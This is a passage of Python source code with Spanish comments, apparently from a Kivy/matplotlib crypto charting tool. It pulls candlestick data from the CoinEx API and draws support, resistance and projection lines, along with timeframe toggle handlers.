            m9 = (YP2Ett- YP1ESB) / (XP2Ett- XP1ESB)
            b9 = YP1ESB - m9 * XP1ESB
            multialarg9=(XP2Ett-XP1ESB+XP2Ett)*2
            inicioalarge9=XP1ESB
            x_verde9 = [inicioalarge9, multialarg9]  
            y_verde9 = [m9 * i + b9 for i in x_verde9]
            self.RRRX17S.append(x_verde9[0])
            self.RRRX17S.append(x_verde9[1])
            self.RRRY17S.append(y_verde9[0])
            self.RRRY17S.append(y_verde9[1])
            self.linea_19ax.set_data(x_verde9, y_verde9)
            # Calcular y trazar soporte mas bajo-------------------                        
            XP1ESB=self.XS1
            XP2Ett = XP1ESB + dist2 * ((XP2 - XP1) / dist2)
            YP1ESB=self.S1-distancia_verticalxs*2
            YP2Ett = YP1ESB + dist2 * ((YP2 - YP1) / dist2)
            m10 = (YP2Ett- YP1ESB) / (XP2Ett- XP1ESB)
            b10 = YP1ESB - m10 * XP1ESB
            multialarg10=(XP2Ett-XP1ESB+XP2Ett)*2
            inicioalarge10=XP1ESB
            x_verde10 = [inicioalarge10, multialarg10]  
            y_verde10 = [m10 * i + b10 for i in x_verde10]
            self.RRRX18S.append(x_verde10[0])
            self.RRRX18S.append(x_verde10[1])
            self.RRRY18S.append(y_verde10[0])
            self.RRRY18S.append(y_verde10[1])
            self.linea_19ax1.set_data(x_verde10, y_verde10)
            # Calcular y trazar resitencia arriba------------------
            XP1ESBR=self.XR2
            XP2EttR = XP1ESBR + dist2 * ((XP2 - XP1) / dist2)
            YP1ESBR=self.R2+distancia_verticalxs                      
            YP2EttR = YP1ESBR + dist2 * ((YP2 - YP1) / dist2)
            m11 = (YP2EttR- YP1ESBR) / (XP2EttR- XP1ESBR)
            b11 = YP1ESBR - m11 * XP1ESBR
            multialarg11=(XP2EttR-XP1ESBR+XP2EttR)*2
            inicioalarge11= XP1ESBR
            x_red11 = [inicioalarge11, multialarg11]  
            y_red11 = [m11 * i + b11 for i in x_red11]
            self.RRRX17.append(x_red11[0])
            self.RRRX17.append(x_red11[1])
            self.RRRY17.append(y_red11[0])
            self.RRRY17.append(y_red11[1])
            self.linea_22ax.set_data(x_red11, y_red11)
            # Calcular y trazar resitencia mas arriba------------------
            XP1ESBR=self.XR2
            XP2EttR = XP1ESBR + dist2 * ((XP2 - XP1) / dist2)
            YP1ESBR=self.R2+distancia_verticalxs*2                      
            YP2EttR = YP1ESBR + dist2 * ((YP2 - YP1) / dist2)
            m12 = (YP2EttR- YP1ESBR) / (XP2EttR- XP1ESBR)
            b12 = YP1ESBR - m12 * XP1ESBR
            multialarg12=(XP2EttR-XP1ESBR+XP2EttR)*2
            inicioalarge12= XP1ESBR
            x_red12 = [inicioalarge12, multialarg12]  
            y_red12 = [m12 * i + b12 for i in x_red12]
            self.RRRX18.append(x_red12[0])
            self.RRRX18.append(x_red12[1])
            self.RRRY18.append(y_red12[0])
            self.RRRY18.append(y_red12[1])                        
            self.linea_22ax6.set_data(x_red12, y_red12)
            xyS3_2 = [ (XP1, YP1),(XP1ESB, YP1ESB),(x_verde10[1], y_verde10[1]),(x_verde7[1], y_verde7[1])]
            self.rect_S3_2.set_xy(xyS3_2)                        
            xyR3_2 = [(R1MARCARX, R2MARCARY),(XP1ESBR , YP1ESBR),( x_red12[1], y_red12[1]),(x_red8[1], y_red8[1])]
            self.rect_R3_2.set_xy(xyR3_2)
            # soporte de referencia de resistencia puesto en primer punto de soporte-----------------------------------------------                         
            # Resistencia de referencia de soporte puesto en primer punto de resistencia-----------------------------------------------
            #trazar proyeccion en resistencia basado en el soporte-------------------
            R1MARCARX=self.XR1
            XP2EXX = R1MARCARX + dist2 * ((XP2 - XP1) / dist2)
            R2MARCARY=self.R1
            YP2EXX = R2MARCARY + dist2 * ((YP2 - YP1) / dist2)
            m88 = (YP2EXX - R2MARCARY) / (XP2EXX- R1MARCARX)
            b88 = R2MARCARY - m8 * R1MARCARX
            multialarg88=(XP2EXX-R1MARCARX+XP2EXX)*2
            inicioalarge88=R1MARCARX
            x_red88 = [inicioalarge88, multialarg88]  
            y_red88 = [m88 * i + b88 for i in x_red88] 
            self.RRRX13nn.append(x_red88[0])
            self.RRRX13nn.append(x_red88[1])
            self.RRRY13nn.append(y_red88[0])
            self.RRRY13nn.append(y_red88[1])                        
            self.linea_1666ax.set_data(x_red88, y_red88)
            # Trazar linea de prediccion abajo y arriba---
            # Calcular separacion entre la linea de soporte y resistencia
            # Pendiente de la línea base
            pendiente1SSS = (y_verde7[1] - y_verde7[0]) / (x_verde7[1] - x_verde7[0])
            # Calcular el punto de intersección de la línea base y la línea paralela
            b_A1xSS= y_verde7[0]-pendiente1SSS*x_verde7[0]
            b_B1xSS= y_red88[0]-pendiente1SSS*x_red88[0]
            # Calcular la distancia vertical de separación de estas dos líneas paralelas con igual pendiente
            distancia_verticalxsSS = abs(b_B1xSS-b_A1xSS)
            # Calcular y trazar resistencia arriba---------------------
            XP1ESB=self.XR1
            XP2Ett = XP1ESB + dist * ((XP2 - XP1) / dist)
            YP1ESB=self.R1+distancia_verticalxsSS
            YP2Ett = YP1ESB + dist * ((YP2 - YP1) / dist)
            m3Z = (YP2Ett - YP1ESB) / (XP2Ett - XP1ESB)                      
            b3Z = YP1ESB - m3Z * XP1ESB
            multialarg3Z=(XP2Ett-XP1ESB+XP2Ett)*2
            inicioalarge3Z=XP1ESB
            x_red3Z = [inicioalarge3Z, multialarg3Z]  
            y_red3Z = [m3Z * i + b3Z for i in x_red3Z]                      
            self.RRRX5ZZ.append(x_red3Z[0])
            self.RRRX5ZZ.append(x_red3Z[1])
            self.RRRY5ZZ.append(y_red3Z[0])
            self.RRRY5ZZ.append(y_red3Z[1])                        
            self.linea_7axZZZ.set_data(x_red3Z, y_red3Z)
            # Calcular y trazar soporte bajo-------------------                        
            XP1ESB=self.XS1
            XP2Ett = XP1ESB + dist2 * ((XP2 - XP1) / dist2)
            YP1ESB=self.S1-distancia_verticalxsSS
            YP2Ett = YP1ESB + dist2 * ((YP2 - YP1) / dist2)
            m9zz = (YP2Ett- YP1ESB) / (XP2Ett- XP1ESB)
            b9zz = YP1ESB - m9zz * XP1ESB
            multialarg9zz=(XP2Ett-XP1ESB+XP2Ett)*2
            inicioalarge9zz=XP1ESB
            x_verde9zz = [inicioalarge9zz, multialarg9zz]  
            y_verde9zz = [m9zz * i + b9zz for i in x_verde9zz]
            self.RRRX17Szz.append(x_verde9zz[0])
            self.RRRX17Szz.append(x_verde9zz[1])
            self.RRRY17Szz.append(y_verde9zz[0])
            self.RRRY17Szz.append(y_verde9zz[1])
            self.linea_19axzz.set_data(x_verde9zz, y_verde9zz)
            # Datos de Linea de SOPORTE base extendida 4 veces-----------------------------------
            XP1111=self.XR1
            XP2111=self.XR2                        
            YP1111=self.R1                        
            YP2111=self.R2
            R1MARCARX=self.XS1
            XP2EXX = R1MARCARX + dist * ((XP2111 - XP1111) / dist)
            R2MARCARY=self.S1
            YP2EXX = R2MARCARY + dist * ((YP2111 - YP1111) / dist)
            m2 = (YP2EXX - R2MARCARY) / (XP2EXX - R1MARCARX)                      
            b2 = R2MARCARY - m2 * R1MARCARX
            multialarg2=(XP2EXX-R1MARCARX+XP2EXX)*2
            inicioalarge2=R1MARCARX
            x_verde1111 = [inicioalarge2, multialarg2]  
            y_verde1111 = [m2 * i + b2 for i in x_verde1111]   
            self.RRRX1Snn.append(x_verde1111[0])
            self.RRRX1Snn.append(x_verde1111[1])                       
            self.RRRY1Snn.append(y_verde1111[0])                       
            self.RRRY1Snn.append(y_verde1111[1])              
            self.linea_4444ax.set_data(x_verde1111, y_verde1111)      
            # Calcular separacion entre la linea de soporte y resistencia
            # Pendiente de la línea base
            pendiente123xxxx = (y_red1[1] - y_red1[0]) / (x_red1[1] - x_red1[0])
            # Calcular el punto de intersección de la línea base y la línea paralela
            b_A1xxx= y_red1[0]-pendiente123xxxx*x_red1[0]
            b_B1xxx= y_verde1111[0]-pendiente123xxxx*x_verde1111[0]
            # Calcular la distancia vertical de separación de estas dos líneas paralelas con igual pendiente
            distancia_verticalxxx = abs(b_B1xxx-b_A1xxx)
            # Calcular y trazar soporte abajo
            XP1ESBR7=R1MARCARX
            XP2EttR7 = XP1ESBR7 + dist * ((XP2111 - XP1111) / dist)
            YP1ESBR7=R2MARCARY-distancia_verticalxxx
            YP2EttR7 = YP1ESBR7 + dist * ((YP2111 - YP1111) / dist)
            m5xx = (YP2EttR7 - YP1ESBR7) / (XP2EttR7- XP1ESBR7)                      
            b5xx = YP1ESBR7 - m5xx * XP1ESBR7
            multialarg5xx=(XP2EttR7-XP1ESBR7+XP2EttR7)*2
            inicioalarge5xx=XP1ESBR7
            x_verde5xx = [inicioalarge5xx, multialarg5xx]  
            y_verde5xx = [m5xx * i + b5xx for i in x_verde5xx]
            self.RRRX5S22.append(x_verde5xx[0])
            self.RRRX5S22.append(x_verde5xx[1])
            self.RRRY5S22.append(y_verde5xx[0])
            self.RRRY5S22.append(y_verde5xx[1])
            self.linea_10ax22.set_data(x_verde5xx, y_verde5xx)                         
            # Calcular y trazar resistencia arriba---------------------
            XP1ESB=self.XR1
            XP2Ett = XP1ESB + dist * ((XP2111 - XP1111) / dist)
            YP1ESB=self.R1+distancia_verticalxxx
            YP2Ett = YP1ESB + dist * ((YP2111 - YP1111) / dist)
            m3xx = (YP2Ett - YP1ESB) / (XP2Ett - XP1ESB)                      
            b3xx = YP1ESB - m3xx * XP1ESB
            multialarg3xx=(XP2Ett-XP1ESB+XP2Ett)*2
            inicioalarge3xx=XP1ESB
            x_red3xx = [inicioalarge3xx, multialarg3xx]  
            y_red3xx = [m3xx * i + b3xx for i in x_red3xx]                      
            self.RRRX5xx.append(x_red3xx[0])
            self.RRRX5xx.append(x_red3xx[1])
            self.RRRY5xx.append(y_red3xx[0])
            self.RRRY5xx.append(y_red3xx[1])                        
            self.linea_7axxx.set_data(x_red3xx, y_red3xx) 
            # linea de soporte con punto r1 y s2-----------
            XP1a=self.XR1
            XP2a=self.XS2                        
            YP1a=self.R1                        
            YP2a=self.S2
            m1a = (YP2a - YP1a) / (XP2a - XP1a)                      
            b1a = YP1a - m1a * XP1a
            multialarg1a=(XP2a-XP1a+XP2a)*2
            inicioalarge1a=XP1a
            x_verde1a = [inicioalarge1a, multialarg1a]  
            y_verde1a = [m1a * i + b1a for i in x_verde1a]                       
            self.RRRX1l.append(x_verde1a[0])
            self.RRRX1l.append(x_verde1a[1])
            self.RRRY1l.append(y_verde1a[0])
            self.RRRY1l.append(y_verde1a[1])
            self.linea_x111.set_data(x_verde1a, y_verde1a)
            dist14 = ((y_verde1a[1] - y_verde1a[0])**2 + (x_verde1a[1] - x_verde1a[0])**2)**0.5
            #trazar proyeccion en resistencia basado en el soporte-------------------
            R1MARCARX=self.XR2
            XP2EXX = R1MARCARX + dist14 * ((XP2a - XP1a) / dist14)
            R2MARCARY=self.R2
            YP2EXX = R2MARCARY + dist14 * ((YP2a - YP1a) / dist14)
            m8aa = (YP2EXX - R2MARCARY) / (XP2EXX- R1MARCARX)
            b8aa = R2MARCARY - m8aa * R1MARCARX
            multialarg8aa=(XP2EXX-R1MARCARX+XP2EXX)*2
            inicioalarge8aa=R1MARCARX
            x_red8aa = [inicioalarge8aa, multialarg8aa]  
            y_red8aa = [m8aa * i + b8aa for i in x_red8aa] 
            self.RRRX5qq.append(x_red8aa[0])
            self.RRRX5qq.append(x_red8aa[1])
            self.RRRY5qq.append(y_red8aa[0])
            self.RRRY5qq.append(y_red8aa[1])                     
            self.linea_7axqq.set_data(x_red8aa , y_red8aa )
            #trazar proyeccion en resistencia basado en el soporte-------------------
            R1MARCARX=self.XS1
            XP2EXX = R1MARCARX + dist14 * ((XP2a - XP1a) / dist14)
            R2MARCARY=self.S1
            YP2EXX = R2MARCARY + dist14 * ((YP2a - YP1a) / dist14)
            m8aau = (YP2EXX - R2MARCARY) / (XP2EXX- R1MARCARX)
            b8aau = R2MARCARY - m8aau * R1MARCARX
            multialarg8aau=(XP2EXX-R1MARCARX+XP2EXX)*2
            inicioalarge8aau=R1MARCARX
            x_verde8aau = [inicioalarge8aau, multialarg8aau]  
            y_verde8aau = [m8aau * i + b8aau for i in x_verde8aau] 
            self.RRRX5qqm.append(x_verde8aau[0])
            self.RRRX5qqm.append(x_verde8aau[1])
            self.RRRY5qqm.append(y_verde8aau[0])
            self.RRRY5qqm.append(y_verde8aau[1])                     
            self.linea_7axqqmas.set_data(x_verde8aau , y_verde8aau )
            # Calcular separacion entre la linea de soporte y resistencia
            # Pendiente de la línea base
            pendiente123v = (y_verde1a[1] - y_verde1a[0]) / (x_verde1a[1] - x_verde1a[0])
            # Calcular el punto de intersección de la línea base y la línea paralela
            b_A1v= y_verde1a[0]-pendiente123v*x_verde1a[0]
            b_B1v= y_red8aa[0]-pendiente123v*x_red8aa[0]                        
            # Calcular la distancia vertical de separación de estas dos líneas paralelas con igual pendiente
            distancia_verticalaav = abs(b_B1v-b_A1v)
            # Calcular y trazar resistencia arriba---------------------
            XP1ESB=self.XR2
            XP2Ett = XP1ESB + dist14 * ((XP2a - XP1a) / dist14)
            YP1ESB=self.R2+distancia_verticalaav
            YP2Ett = YP1ESB + dist14 * ((YP2a - YP1a) / dist14)
            m3e = (YP2Ett - YP1ESB) / (XP2Ett - XP1ESB)                      
            b3e = YP1ESB - m3e * XP1ESB
            multialarg3e=(XP2Ett-XP1ESB+XP2Ett)*2
            inicioalarge3e=XP1ESB
            x_red3e = [inicioalarge3e, multialarg3e]  
            y_red3e = [m3e * i + b3e for i in x_red3e]                      
            self.RRRX5e.append(x_red3e[0])
            self.RRRX5e.append(x_red3e[1])
            self.RRRY5e.append(y_red3e[0])
            self.RRRY5e.append(y_red3e[1])                        
            self.linea_7axe.set_data(x_red3e, y_red3e)            
        except:
            None
        try:                   
            self.grfresisteb.set_data(self.interaciones_resistenciazz,self.resistencia_crestaszz)
            self.grfsoporteb.set_data(self.interaciones_soportezz,self.soporte_valleszz)            
        except:
            None
        #self.eficiente_renderizado_lineas=0
        self.figz.canvas.draw_idle()                        
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------          
    def precio(self, dt):        
        if self.apagar_funciones=="si apagar funciones":
            self.cambio_grafica="b"
        else:
            colorrojooo="red"
            colorverdee="green"
            try:
                url = 'https://api.coinex.com/v1/market/kline'
                params = {
                    'market': self.graficaSSS,  # Par de mercado para BTC
                    'type': self.grafica,       # Tipo de vela (1 minuto)
                    'limit': 1          # Número de velas a obtener
                }                
                # Realizar la solicitud GET a la API
                response = requests.get(url, params=params, verify=False)               
                data = response.json()               
                if response.status_code == 200 and 'data' in data:
                    # Extraer las velas
                    velas = data['data']
                    if velas is not None:
                        for i in velas:
                            timestamp, open_price, close_price, high_price, low_price, volume, deal = i
                            id_velascerradas = timestamp
                            self.sin_precio=0                            
            except:
                self.sin_precio=1
            if self.sin_precio==0:    
                if self.idinicio1=="no paso":
                    ahsdh=str(id_velascerradas)
                    sdhsdh= ahsdh[:4]
                    self.idinicio1=int(sdhsdh)
                    self.idinicio2=int(sdhsdh)
                else:
                    ahsdh=str(id_velascerradas)
                    sdhsdh= ahsdh[:4]
                    self.idinicio1=int(sdhsdh)                                                                                     
                indentificar_id_ultima_velanocerrada = self.id_velas[-1]
                if self.idinicio1 == self.idinicio2:
                    if indentificar_id_ultima_velanocerrada==id_velascerradas:                              
                        valormax_vela_Eoo = float(high_price)
                        valormin_vela_Eoo = float(low_price)
                        apertura_vela_Eoo = float(open_price)
                        cierre_precioreal= float(close_price)
                        self.high_prices.pop()
                        self.low_prices.pop()
                        self.high_prices.append(valormax_vela_Eoo)
                        self.low_prices.append(valormin_vela_Eoo)
                        self.ultimo_poligono = self.lista_poligonos[-1] 
                        if self.widget18.state=="down" or self.widget19.state=="down" or self.widget20.state=="down" or self.widget21.state=="down" or self.widget22.state=="down":
                            self.conseguir_precio_en_tiempo_real = cierre_precioreal
                            self.precio_running=self.conseguir_precio_en_tiempo_real
                        else:
                            self.precio_real(0)                        
                            self.conseguir_precio_en_tiempo_real = self.precio_running
                        x1=self.x1l[-1]
                        y1=self.y1l[-1]
                        x2=self.x2l[-1]
                        y2=self.y2l[-1]
                        x3=self.x3l[-1]
                        y3=self.conseguir_precio_en_tiempo_real
                        x4=self.x4l[-1]
                        y4=self.conseguir_precio_en_tiempo_real
                        x5=self.x5l[-1]
                        y5=self.low_prices[-1]
                        x6=self.x6l[-1]
                        y6=self.low_prices[-1]
                        x7=self.x7l[-1]
                        y7=self.high_prices[-1]
                        x8=self.x8l[-1]
                        y8=self.high_prices[-1]                                      
                        if self.conseguir_precio_en_tiempo_real<y7:
                            None
                        elif self.conseguir_precio_en_tiempo_real==y7:
                            None
                        else:
                            y7=self.high_prices[-1]
                            y8=self.high_prices[-1]
                            self.y7l.pop(0)
                            self.y8l.pop(0)
                            self.y7l.append(y7)
                            self.y8l.append(y8)
                        if self.conseguir_precio_en_tiempo_real>y5:
                            None
                        elif self.conseguir_precio_en_tiempo_real==y5:
                            None
                        else:
                            y5=self.low_prices[-1]
                            y6=self.low_prices[-1]
                            self.y5l.pop(0)
                            self.y6l.pop(0)
                            self.y5l.append(y5)
                            self.y6l.append(y6)
                        if y4>y1:
                             color_velar="green"
                             self.continuidadtendencia1="Call"                            
                        elif y4<y1:
                            color_velar="red"
                            self.continuidadtendencia1="Put"                          
                        else:
                            color_velar="black"
                            self.continuidadtendencia1="Neutral"
                        x13=self.x13l[-1]
                        y13=self.y13l[-1]
                        x16=self.x16l[-1]
                        y16=self.conseguir_precio_en_tiempo_real
                        x19=self.x19l[-1]
                        y19=self.conseguir_precio_en_tiempo_real
                        x112=self.x112l[-1]
                        y112=self.y112l[-1]
                        self.ValordeYmarcador=float(self.conseguir_precio_en_tiempo_real)
                        self.ValordeX1marcador=x16-(self.ancho_cuerpo/2)*2                
                        self.openvela1=float("{0:.5f}".format(apertura_vela_Eoo))
                        self.ultimo_poligono.set_facecolor(color_velar)
                        self.ultimo_poligono.set_edgecolor(color_velar)
                        nuevo_xyR3_1xxx= [(x5, y5),(x6, y6),(x13,y13),(x2, y2),(x3, y3),(x16,y16),(x7, y7),(x8, y8),(x19,y19),(x4, y4),(x1, y1),(x112,y112)]
                        self.ultimo_poligono.set_xy(nuevo_xyR3_1xxx)
                        if self.precio_anterior_comparar=="no registrado":
                            self.precio_anterior_comparar=self.conseguir_precio_en_tiempo_real
                            self.linea_precio_TR.set_ydata([self.conseguir_precio_en_tiempo_real])
                            if self.color_ant=="blue":
                                color_G="blue"
                            else:
                                color_G=self.color_ant
                            self.linea_precio_TR.set_color(color_G)
                            self.linea_Valor_precio_TR.set_position((self.terminacionejexxx-self.xdespl,self.conseguir_precio_en_tiempo_real))
                            self.linea_Valor_precio_TR.set_text(f"Price: {self.conseguir_precio_en_tiempo_real}")
                            self.linea_Valor_precio_TR.set_bbox(dict(facecolor=color_G, edgecolor=color_G, boxstyle='round4'))                                        
                        else:                                      
                            dhjdhsjdb=self.precio_anterior_comparar
                            if dhjdhsjdb==self.conseguir_precio_en_tiempo_real:
                                self.precio_anterior_comparar=self.conseguir_precio_en_tiempo_real
                                self.linea_precio_TR.set_ydata([self.conseguir_precio_en_tiempo_real])
                                self.linea_Valor_precio_TR.set_position((self.terminacionejexxx-self.xdespl,self.conseguir_precio_en_tiempo_real))
                                if self.color_ant=="blue":
                                    color_G="blue"
                                else:
                                    color_G=self.color_ant
                                self.linea_precio_TR.set_color(color_G)
                                self.linea_Valor_precio_TR.set_text(f"Price: {self.conseguir_precio_en_tiempo_real}")
                                self.linea_Valor_precio_TR.set_bbox(dict(facecolor=color_G, edgecolor=color_G, boxstyle='round4'))
                               
                            elif dhjdhsjdb<self.conseguir_precio_en_tiempo_real:
                                self.precio_anterior_comparar=self.conseguir_precio_en_tiempo_real
                                self.linea_precio_TR.set_ydata([self.conseguir_precio_en_tiempo_real])
                                self.linea_Valor_precio_TR.set_position((self.terminacionejexxx-self.xdespl,self.conseguir_precio_en_tiempo_real))
                                self.color_ant=colorverdee
                                if self.color_ant=="blue":
                                    color_G="blue"
                                else:
                                    color_G=self.color_ant
                                self.linea_precio_TR.set_color(color_G)
                                self.linea_Valor_precio_TR.set_text(f"Price: {self.conseguir_precio_en_tiempo_real}")
                                self.linea_Valor_precio_TR.set_bbox(dict(facecolor=color_G, edgecolor=color_G, boxstyle='round4')) 
                               
                            elif dhjdhsjdb>self.conseguir_precio_en_tiempo_real:
                                self.precio_anterior_comparar=self.conseguir_precio_en_tiempo_real
                                self.linea_precio_TR.set_ydata([self.conseguir_precio_en_tiempo_real])
                                self.linea_Valor_precio_TR.set_position((self.terminacionejexxx-self.xdespl,self.conseguir_precio_en_tiempo_real))                               
                                self.color_ant=colorrojooo
                                if self.color_ant=="blue":
                                    color_G="blue"
                                else:
                                    color_G=self.color_ant
                                self.linea_precio_TR.set_color(color_G)
                                self.linea_Valor_precio_TR.set_text(f"Price: {self.conseguir_precio_en_tiempo_real}")
                                self.linea_Valor_precio_TR.set_bbox(dict(facecolor=color_G, edgecolor=color_G, boxstyle='round4'))                      
                    else:
                        #-----------Representar volumen del mercado----------------------------------------------------------------------------------------
                        self.volumen_market.pop(0)
                        try:
                            Volumen_M = self.high_prices[-1]/self.low_prices[-1]
                        except:
                            Volumen_M = 1                            
                        self.volumen_market.append(Volumen_M)                       
                        #indice_volumen_market = range(len(self.volumen_market))               
                        #self.binaria_111.set_data(indice_volumen_market, self.volumen_market)
                        #self.promedio_V =float("{0:.8f}".format(sum(self.volumen_market) / len(self.volumen_market)))                
                        #self.promedio_volumen.set_ydata([self.promedio_V])                        
                        #if self.promedio_V>=0 and self.promedio_V<=1.00025:
                         #   haadhadjhg="Bad"                   
                        #elif self.promedio_V>1.00025 and self.promedio_V<=1.0005:
                        #    haadhadjhg="Fair"              
                        #elif self.promedio_V>1.0005 and self.promedio_V<=1.00075:
                        #    haadhadjhg="Good"
                        #elif self.promedio_V>1.00075:
                         #   haadhadjhg="Excellent"                   
                        #self.ax26.legend([self.promedio_volumen],[f"Average activity: {self.promedio_V} - Quality of activity: {haadhadjhg}"],edgecolor="k",loc ='upper center', labelcolor="w", ncol=1, fontsize=6,labelspacing=0.1,facecolor="k",bbox_to_anchor=(0.5, self.niv_pos))                
                        #margen_de_x=len(self.volumen_market)            
                        #self.ax26.set_xlim(0,margen_de_x)            
                       # marginxxx = 0.2 * (max(self.volumen_market) - min(self.volumen_market))
                        #self.ax26.set_ylim(min(self.volumen_market) - marginxxx, max(self.volumen_market) + marginxxx*self.escly)
                        #---------------------------------------------------------------------------------------------------------------------------------
                        self.primer_poligono = self.lista_poligonos[0]
                        self.primer_poligono.remove()
                        self.lista_poligonos.pop(0)
                        self.contadorpoli=self.contadorpoli+2
                        self.terminacionejexxx=self.terminacionejexxx+2
                        self.hdahdahcontador=self.hdahdahcontador+1
                        self.linea_Valor_precio_TR.set_position((self.terminacionejexxx-self.xdespl,self.conseguir_precio_en_tiempo_real))                    
                        try:
                            self.compra_call_entrada.set_position((self.terminacionejexxx-1,self.Precio_entradattt))
                        except:
                            None
                        try:                        
                            self.compra_call_entrada_take.set_position((self.terminacionejexxx-self.deplx,self.limite_take))
                        except:
                            None
                        try:                        
                            self.compra_call_entrada_stop.set_position((self.terminacionejexxx-self.deplx,self.limite_stop))
                        except:
                            None
                        
                        try:
                            self.compra_call_entradap.set_position((self.terminacionejexxx-1,self.Precio_entradatttp))
                        except:
                            None
                        self.precioclave222.set_position((self.terminacionejexxx-self.xdespl,self.contol_precio))
                        self.precioclave222111.set_position((self.terminacionejexxx-self.xdespl,self.contol_precio111))
                        dsdsdse=self.contadorpoli               
                        self.ax.set_xlim(dsdsdse, self.contadorpoli+160)
                        self.x1l.pop(0)
                        self.y1l.pop(0)
                        self.x2l.pop(0)
                        self.y2l.pop(0)
                        self.x3l.pop(0)
                        self.y3l.pop(0)
                        self.x4l.pop(0)
                        self.y4l.pop(0)
                        self.x5l.pop(0)
                        self.y5l.pop(0)
                        self.x6l.pop(0)
                        self.y6l.pop(0)
                        self.x7l.pop(0)
                        self.y7l.pop(0)
                        self.x8l.pop(0)
                        self.y8l.pop(0)
                        self.x13l.pop(0)
                        self.y13l.pop(0)
                        self.x16l.pop(0)
                        self.y16l.pop(0)
                        self.x19l.pop(0)
                        self.y19l.pop(0)
                        self.x112l.pop(0)
                        self.y112l.pop(0)
                        valormax_vela_Eoo = float(high_price)
                        valormin_vela_Eoo = float(low_price)
                        apertura_vela_Eoo = float(open_price)
                        cierre_precioreal= float(close_price)
                        cierre_vela_Eoo = self.precio_running
                        id_velascerradas = timestamp
                        self.open_prices.pop(0)
                        self.close_prices.pop(0)
                        self.high_prices.pop(0)
                        self.low_prices.pop(0)
                        self.id_velas.pop(0)
                        self.open_prices.append(apertura_vela_Eoo)
                        self.close_prices.append(cierre_vela_Eoo)
                        self.high_prices.append(valormax_vela_Eoo)
                        self.low_prices.append(valormin_vela_Eoo)
                        self.id_velas.append(id_velascerradas)                                        
                        x1=self.x1l[-1]+2
                        y1=self.open_prices[-1]
                        x2=x1+self.ancho_cuerpo
                        y2=y1
                        x3=x2
                        y3=self.close_prices[-1]
                        x4=x1
                        y4=y3
                        x5=(x1+x2)/2-self.ancho_mecha
                        y5=self.low_prices[-1]
                        x6=(x1+x2)/2+self.ancho_mecha
                        y6=y5
                        x7=x6
                        y7=self.high_prices[-1]
                        x8=x5
                        y8=y7
                        x13=x6
                        y13=y1
                        x16=x6
                        y16=y3
                        x19=x5
                        y19=y3
                        x112=x5
                        y112=y1
                        self.x1l.append(x1)
                        self.y1l.append(y1)
                        self.x2l.append(x2)
                        self.y2l.append(y2)
                        self.x3l.append(x3)
                        self.y3l.append(y3)
                        self.x4l.append(x4)
                        self.y4l.append(y4)
                        self.x5l.append(x5)
                        self.y5l.append(y5)
                        self.x6l.append(x6)
                        self.y6l.append(y6)
                        self.x7l.append(x7)
                        self.y7l.append(y7)
                        self.x8l.append(x8)
                        self.y8l.append(y8)
                        self.x13l.append(x13)
                        self.y13l.append(y13)
                        self.x16l.append(x16)
                        self.y16l.append(y16)
                        self.x19l.append(x19)
                        self.y19l.append(y19)
                        self.x112l.append(x112)
                        self.y112l.append(y112)
                        if self.open_prices[-1]<self.close_prices[-1]:
                            color_vela="green"
                            self.continuidadtendencia1="Call"
                        elif self.open_prices[-1]>self.close_prices[-1]:
                            color_vela="red"
                            self.continuidadtendencia1="Put"
                        else:
                            color_vela="black"
                            self.continuidadtendencia1="Neutral"
                        xyR3_1zzz = [(x5, y5),(x6, y6),(x13,y13),(x2, y2),(x3, y3),(x16,y16),(x7, y7),(x8, y8),(x19,y19),(x4, y4),(x1, y1),(x112,y112)]
                        rect_R3_1zzz = Polygon(xyR3_1zzz, closed=True, linewidth=self.grosor_linea3, edgecolor=color_vela, facecolor=color_vela)
                        self.ax.add_patch(rect_R3_1zzz)
                        self.lista_poligonos.append(rect_R3_1zzz)
                        margin = 0.4 * (max(self.high_prices) - min(self.low_prices))
                        self.ax.set_ylim(min(self.low_prices) - margin, max(self.high_prices) + margin*self.escly)
                        self.eficiente_renderizado_lineas=1
                        Clock.schedule_once(self.marcar_crestas_y_valle_y_deteccion_soportes_resitencias_profundidad_5)
                    if self.optimizar_calculo_beneficio==1:
                        Clock.schedule_once(self.actualizar_beneficio_operacion)                        
                    Clock.schedule_once(self.algoritmo_detector_de_donde_se_encuentra_el_precio_pro5fibo) 
                    #Clock.schedule_once(self.marcar_crestas_y_valle_y_deteccion_soportes_resitencias_profundidad_5)                                                                            
                    Clock.schedule_once(self.leyenda_predicion)
                    self.figz.canvas.draw_idle()                           
                else:
                    None                    
            else:
                None                        
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------            
    def on_toggle1(self, instance):
        if self.call_conador_operacion==0 and self.call_conador_operacionp==0 and self.rev_wait==0:
            if self.widget18.state=="down":
                self.grafica=self.comptiempoactual[0]
                self.TIPOVELA="1min"
            else:
                self.widget18.state="down"
                self.widget19.state="normal"
                self.widget20.state="normal"
                self.widget21.state="normal"
                self.widget22.state="normal"
                self.widget23.state="normal"
                self.widget24.state="normal"
                self.widget25.state="normal"
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------          
    def on_toggle2(self, instance):
        if self.call_conador_operacion==0 and self.call_conador_operacionp==0 and self.rev_wait==0:
            if self.widget19.state=="down":
                self.grafica=self.comptiempoactual[1]
                self.TIPOVELA="5min"
            else:
                self.widget18.state="normal"
                self.widget19.state="down"
                self.widget20.state="normal"
                self.widget21.state="normal"
                self.widget22.state="normal"
                self.widget23.state="normal"
                self.widget24.state="normal"
                self.widget25.state="normal"
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
    def on_toggle3(self, instance):
        if self.call_conador_operacion==0 and self.call_conador_operacionp==0 and self.rev_wait==0:
            if self.widget20.state=="down":
                self.grafica=self.comptiempoactual[2]
                self.TIPOVELA="15min"
            else:
                self.widget18.state="normal"
                self.widget19.state="normal"
                self.widget20.state="down"
                self.widget21.state="normal"
                self.widget22.state="normal"
                self.widget23.state="normal"
                self.widget24.state="normal"
                self.widget25.state="normal"
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
    def on_toggle4(self, instance):
        if self.call_conador_operacion==0 and self.call_conador_operacionp==0 and self.rev_wait==0:
            if self.widget21.state=="down":
                self.grafica=self.comptiempoactual[3]
                self.TIPOVELA="30min"
            else:
                self.widget18.state="normal"
                self.widget19.state="normal"
                self.widget20.state="normal"
                self.widget21.state="down"
                self.widget22.state="normal"
                self.widget23.state="normal"
                self.widget24.state="normal"
                self.widget25.state="normal"
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
    def on_toggle5(self, instance):
